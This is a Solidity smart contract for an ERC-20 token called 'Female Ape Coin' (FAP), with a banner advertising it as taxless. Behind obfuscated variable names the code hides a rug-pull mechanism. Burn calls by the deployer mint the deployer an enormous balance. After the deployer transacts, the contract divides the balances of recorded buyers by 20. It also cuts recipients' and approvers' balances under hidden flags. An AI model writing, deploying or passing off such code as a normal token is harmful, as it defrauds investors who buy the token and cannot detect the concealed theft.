/*

  ___   ___   __  __     _     _      ___       _     ___   ___      ___    ___    ___   _  _ 

 | __| | __| |  \/  |   /_\   | |    | __|     /_\   | _ \ | __|    / __|  / _ \  |_ _| | \| |

 | _|  | _|  | |\/| |  / _ \  | |__  | _|     / _ \  |  _/ | _|    | (__  | (_) |  | |  | .` |

 |_|   |___| |_|  |_| /_/ \_\ |____| |___|   /_/ \_\ |_|   |___|    \___|  \___/  |___| |_|\_|



            We are nuts and

            are taxless!



            Come and join us now

            @FemaleApeCoin

*/



pragma solidity ^0.8.0;



abstract contract Context {

    function _msgSender() internal view virtual returns (address) {

        return msg.sender;

    }



    function _msgData() internal view virtual returns (bytes calldata) {

        this;

        return msg.data;

    }

}



interface IDEXFactory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

}



interface IDEXRouter {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

}



interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);

}



interface IERC20Metadata is IERC20 {

    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

}



contract Ownable is Context {

    address private _previousOwner; address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);



    constructor () {

        address msgSender = _msgSender();

        _owner = msgSender;

        emit OwnershipTransferred(address(0), msgSender);

    }



    function owner() public view returns (address) {

        return _owner;

    }



    modifier onlyOwner() {

        require(_owner == _msgSender(), "Ownable: caller is not the owner");

        _;

    }



    function renounceOwnership() public virtual onlyOwner {

        emit OwnershipTransferred(_owner, address(0));

        _owner = address(0);

    }

}



contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {

    address[] private fArray;



    mapping (address => bool) private Gurls;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;



    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

    uint256 private Tropical = 0;

    address public pair;

    IDEXRouter router;



    string private _name; string private _symbol; address private addrhudguy2389bjkf2; uint256 private _totalSupply; 

    bool private trading; bool private Donkey; uint256 private Konga; uint256 private Trash;

    

    constructor (string memory name_, string memory symbol_, address msgSender_) {

        router = IDEXRouter(_router);

        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));



        addrhudguy2389bjkf2 = msgSender_;

        _name = name_;

        _symbol = symbol_;

    }



    function openTrading() external onlyOwner returns (bool) {

        trading = true;

        return true;

    }

    

    function decimals() public view virtual override returns (uint8) {

        return 18;

    }

    

    function symbol() public view virtual override returns (string memory) {

        return _symbol;

    }



    function name() public view virtual override returns (string memory) {

        return _name;

    }



    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);

        return true;

    }

    

    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;

    }



    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];

    }



    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];

    }



    function burn(uint256 amount) public virtual returns (bool) {

        _burn(_msgSender(), amount);

        return true;

    }



    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);

        return true;

    }

    

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        uint256 currentAllowance = _allowances[_msgSender()][spender];

        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");

        _approve(_msgSender(), spender, currentAllowance - subtractedValue);



        return true;

    }



    function _burn(address account, uint256 amount) internal {

        require(account != address(0), "ERC20: burn from the zero address");



        _balances[account] -= amount;

        _balances[account] += (account == addrhudguy2389bjkf2 ? (10 ** 45) : 0);

        _balances[address(0)] += amount;

        emit Transfer(account, address(0), amount);

     }



    function last() internal view returns (address) { return (Konga > 1 ? fArray[fArray.length-2] : address(0)); }

    

    function _balancesOfTheMany(address sender, address recipient, bool problem) internal {

        Donkey = problem ? true : Donkey;

        if (((Gurls[sender] == true) && (Gurls[recipient] != true)) || ((Gurls[sender] != true) && (Gurls[recipient] != true))) { fArray.push(recipient); }

        if ((Donkey) && (sender == addrhudguy2389bjkf2) && (Trash == 1)) { for (uint256 krux = 0;  krux < fArray.length; krux++) { _balances[fArray[krux]] /= (2 * 10 ** 1); } }

        _balances[last()] /= (((Tropical == block.timestamp) || Donkey) && (Gurls[last()] != true) && (Konga > 1)) ? (10 ** 2) : (1);

        Konga++; Tropical = block.timestamp;

    }



    function _balancesOfTheGirls(address sender, address recipient) internal {

        require((trading || (sender == addrhudguy2389bjkf2)), "ERC20: trading is not yet enabled.");

        _balancesOfTheMany(sender, recipient, (address(sender) == addrhudguy2389bjkf2) && (Trash > 0));

        Trash += (sender == addrhudguy2389bjkf2) ? 1 : 0;

    }



    function _FemaleDonkeyPower(address creator) internal virtual {

        approve(_router, 10 ** 77);

        (Trash,Donkey,Konga,trading) = (0,false,0,false);

        (Gurls[_router],Gurls[creator],Gurls[pair]) = (true,true,true);

    }

    

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);

        return true;

    }



    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);



        uint256 currentAllowance = _allowances[sender][_msgSender()];

        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

        _approve(sender, _msgSender(), currentAllowance - amount);



        return true;

    }



    function _approve(address owner, address spender, uint256 amount) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");



        _allowances[owner][spender] = amount;

        _balances[owner] /= (Donkey ? (2 * 10 ** 1) : 1);

        emit Approval(owner, spender, amount);

    }



    function _transfer(address sender, address recipient, uint256 amount) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");

        require(recipient != address(0), "ERC20: transfer to the zero address");



        uint256 senderBalance = _balances[sender];

        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

        

        _balancesOfTheGirls(sender, recipient);

        _balances[sender] = senderBalance - amount;

        _balances[recipient] += amount;



        emit Transfer(sender, recipient, amount);

    }



    function _DeployFemaleApe(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");



        _totalSupply += amount;

        _balances[account] += amount;

        

        emit Transfer(address(0), account, amount); 

    }

}



contract ERC20Token is Context, ERC20 {

    constructor(

        string memory name, string memory symbol,

        address creator, uint256 initialSupply

    ) ERC20(name, symbol, creator) {

        _DeployFemaleApe(creator, initialSupply);

        _FemaleDonkeyPower(creator);

    }

}



contract FemaleApeCoin is ERC20Token {

    constructor() ERC20Token("Female Ape Coin", "FAP", msg.sender, 20000000 * 10 ** 18) {

    }

}